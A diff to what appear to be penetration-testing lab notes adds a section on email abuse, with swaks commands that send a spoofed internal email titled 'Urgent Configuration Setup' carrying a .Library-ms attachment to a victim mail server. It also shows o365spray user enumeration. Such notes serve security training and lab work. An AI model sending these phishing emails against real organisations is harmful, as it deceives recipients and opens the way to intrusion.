@@ -400,6 +400,19 @@ python3 o365spray.py --enum -U users.txt --domain msexample.com
 ```
 
 
+## Sending emails Abuse
+
+[swaks](swaks.md)
+
+
+```
+sudo swaks -t daniela@beyond.com --from johnt@beyond.com -ap --attach config.Library-ms --server 192.168.174.199 --body test.txt --header "Subject: Urgent Configuration Setup" --suppress-data
+```
+
+We attach the file config.Library-ms and as a body we send the test.txt. The victim IP 192.168.174.199 . 
+
+
+
 ## Password Attacks
 
 ### Custom mail servers
@@ -472,3 +485,14 @@ The vulnerability in this service lies in the program's code, namely in the func
 
 The configuration file for Porsfix service is `/etc/postfix/main.cf`
 
+
+##
+
+```
+sudo swaks -t bob@victim-corp.com --from test@victim-corp.com -ap --attach configuration.Library-ms --server <victim-ip> --body body.txt --header "Subject: Urgent Configuration Setup" --suppress-data
+
+```
+
+```
+sudo swaks -t bob@victim-corp.com --from test@victim-corp.com -ap --attach configuration.Library-ms --server 192.168.174.199 --body test.txt --header "Subject: Urgent Configuration Setup" --suppress-data
+```
